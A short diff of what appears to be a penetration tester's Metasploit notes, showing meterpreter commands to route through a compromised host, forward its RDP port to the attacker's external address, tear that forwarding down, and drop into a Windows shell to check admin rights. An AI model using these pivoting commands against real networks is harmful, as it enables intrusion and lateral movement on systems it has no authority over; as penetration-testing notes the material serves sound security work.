@@ -32,8 +32,11 @@ exploit -j
 #setup route through meterpeter session for further port scanning/exploitation
 route add LOCALIP_OF_SERVER 255.255.255.0 1
 
-#setup port forwarding to expose private ports/services for further exploitation (expose RDP)
-portfwd add -L EXTERNAL_IP_OF_METASPLOIT -l 3389 -p 3389 -r LOCALIP_OF_SERVER
+#remove route 
+route remove LOCALIP_OF_SERVER 255.255.255.0 1
+
+#remove port forwarding 
+portfwd delete -L EXTERNAL_IP_OF_METASPLOIT -l 3389 -p 3389 -r LOCALIP_OF_SERVER
 
 #check if in local administrator group (from windows command shell)
 meterpreter>shell
